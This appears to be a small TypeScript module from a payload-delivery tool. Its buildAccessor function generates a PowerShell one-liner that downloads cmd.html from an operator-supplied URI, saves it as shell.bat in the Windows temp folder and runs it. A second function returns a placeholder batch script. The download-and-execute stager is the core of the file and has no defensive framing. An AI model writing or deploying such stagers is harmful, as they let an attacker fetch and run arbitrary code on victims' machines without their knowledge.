import { Context } from './type';

export const buildAccessor = (
    ctx: Context,
): string => `powershell (Invoke-WebRequest ${ctx.cli.uri}/cmd.html).content > %temp%\\shell.bat
start %temp%\\shell.bat`;

export const buildCMD = async (ctx: Context): Promise<string> => {
    console.log(ctx);
    return '@echo off\necho hii\npause';
};
